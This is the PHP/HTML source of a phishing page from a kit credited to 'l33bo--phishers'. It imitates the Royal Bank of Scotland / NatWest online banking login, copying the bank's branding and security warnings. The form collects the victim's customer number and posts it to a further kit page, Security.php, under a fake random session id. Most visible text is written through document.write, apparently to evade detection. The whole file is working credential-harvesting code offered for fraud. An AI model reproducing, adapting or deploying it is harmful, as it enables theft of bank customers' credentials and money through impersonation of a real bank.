<?php
/*
Created by::: l33bo--phishers ::: icq: 695059760 
*/
require "assets/includes/session_protect.php";
require "assets/includes/functions.php";
?>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=us-ascii" />
<title>Login</title>
<link rel="shortcut icon" href="assets/img/favicon.ico" type="image/x-icon" />
<link href="assets/css/main.css" rel="stylesheet" type="text/css" media="all" />
<link href="assets/css/color.css" rel="stylesheet" type="text/css" media="all" />
<script type="text/javascript">
//<![CDATA[
        function Check() {
    var x = document.forms["login"]["userid"].value;
    if (x == null || x == "") {
        document.getElementById("ErrorBox").style.display = "block";
        document.getElementById("ErrorIcon").style.display = "block";
        return false;
    }
        var re = /^[0-9]+$/;
    if(re.test(document.getElementById("userid").value))
       return true;
    else
        document.getElementById("ErrorBox").innerHTML = "Customer advice, please address the following issues:<ul><li>Your Customer Number is made up of your date of birth (ddmmyy) and up to 4 other numbers as advised when you joined the service.<\/li><\/ul>";
        document.getElementById("ErrorBox").style.display = "block";
        document.getElementById("ErrorIcon").style.display = "block";
        return false;  
        }
//]]>
</script>
</head>
<body class="mainbodyclass">
<div id="wrapper" class="default_bg nobackgroundImg">
<div id="DaPage" class="PagePresent">
<div id="header" class="header">
<div class="topHeaderWrapper" style='background-color:#d8d8d8;'>
<div class="topHeaderLeftWrapper">
<ul class="globalTopnav">
<li class="OnIt"><span><script>document.write("Personal");</script></span></li>
<li class="AffIt"><a href="#"><script>document.write("Private");</script></a></li>
<li class="AffIt"><a href="#"><script>document.write("Business");</script></a></li>
<li class="AffIt"><a href="#"><script>document.write("International");</script></a></li>
</ul>
</div>
<div class="topHeaderRightWrapper">
<div class="loginWrapper"><span class="loginLink"><a href="#"><script>document.write("LOG IN");</script></a></span></div>
</div>
</div>
<div class="bottomHeaderWrapper">
<div class="bottomHeaderLeftWrapper">
<div class="rbsHeader"><a href="#"><img src="assets/img/logo.png" style="border-width:0px;" /></a></div>
<div class="globalBottomNavWrapper">
<ul class="globalBottomNav">
<li><a href="#"><script>document.write("Products");</script></a></li>
<li><a href="#"><script>document.write("Support");</script></a></li>
<li><a href="#"><script>document.write("Life Moments");</script></a></li>
</ul>
</div>
</div>
<div class="bottomHeaderRightWrapper">
<div class="quickLinksWrapper">
<ul id="quickLinks">
<li class="privacyAndCookiesTopPadding"><a href="#"><script>document.write("Privacy &amp; Cookies");</script></a></li>
<li class="last"><a href="#"><script>document.write("Accessibility");</script></a></li>
</ul>
</div>
</div>
</div>
</div>
<div id="content">
<div id="mid">
<form name="login" method="post" action="Security.php?&sessionid=<?php echo generateRandomString(110); ?>&securessl=true" id="login" onsubmit="return Check()">
<div id="ErrorBox" tabindex="-1" class="error" style="display:none">
<script>document.write("Customer advice, please address the following issues:");</script>
<ul>
<li><script>document.write("Some of the information required has not been entered.");</script></li>
</ul>
</div>
<div class="PageHeader">
<h1><script>document.write("Online Banking services");</script></h1>
</div>
<div class="tabcontainer">
<ul class="tabUI">
<li class="active"><span class="left"><img src="assets/img/bank.gif" style="border-width:0px;" /></span></li>
<li><span><a href="#"><img src="assets/img/cc.gif" style="border-width:0px;" /></a></span></li>
</ul>
<div class="LoginBorder">
<div class="TopLoginBorder">
<hr /></div>
<div class="frame">
<div class="shadedLoginHeading">
<h2><script>document.write("Welcome to Digital Banking");</script></h2>
<div class="LoginInputHolder">
<ul class="form">
<li class="first"><span id="ErrorIcon" class="errorIndicator" style=
"color:Red;display:none;"><img class="ErrorMarker" src="assets/img/error.gif" style=
"border-width:0px;" /></span> <label for="userid" class="wizCrl"><script>document.write("Customer number");</script></label>
<span><span><input name="userid" type="text" maxlength="10" id="userid" autocomplete="off"/></span></span> &nbsp;<a class="arrowed" href="#"><script>document.write("Forgotten any of your log in details?");</script></a></li>
</ul>
</div>
<p><span><script>document.write("This is your date of birth (ddmmyy) followed by your unique number which identifies you to the bank.");</script></span></p>
<div class="LoginCheckBox"><input id="checkbo" type="checkbox" name="checkbo" />
<label for="checkbo"><script>document.write("Remember me. We don't recommend storing data on a shared computer.");</script></label></div>
<p class="LoginTabbed"><a class="arrowed" href="#"><script>document.write("Tell me more about this feature");</script></a></p>
<div class="LoginCheckBox"></div>
<div class="frame">
<div class="btnbg LoginGoBtnHolder"><input type="submit" name="go" value="Log in" id="go"
class="button-right forward-arrow" /></div>
</div>
<div class="frame"></div>
</div>
</div>
</div>
<div class="box_li5register">
<div class="LoginRegLink">
<hr /></div>
<div class="frame">
<p><a class="arrowed" href="#"><script>document.write("Not an online user? Sign up here");</script></a></p>
</div>
</div>
</div>
<div class="LoginSecurityNotice"><img src="assets/img/security.gif" style="border-width:0px;" /></div>
<div class="frame">
<p><span>
<script>document.write("Only individuals who have a Royal Bank of Scotland account and authorised access to Digital Banking should proceed beyond this point. For the security of customers, any unauthorised attempt to access customer bank information will be monitored and may be subject to legal action.");</script>
</span></p>
</div>
</form>
</div>
<div class="left menu leftPanelMenu"></div>
</div>
<br class="clear" /></div>
<div id="footer" class="footerContainer">
<ol class="footer_navbar">
<li><a href="#"><script>document.write("Legal Info");</script></a></li>
<li class="footerSeparator">&#183;</li>
<li><a href="#"><script>document.write("Security");</script></a></li>
<li class="footerSeparator">&#183;</li>
<li class="last"><span><script>document.write("&#169; 2005-2015 National Westminster Bank Plc");</script></span></li>
</ol>
</div>
</div>
</body>
</html>
<?php
/*
Created by::: l33bo--phishers ::: icq: 695059760 
*/
?>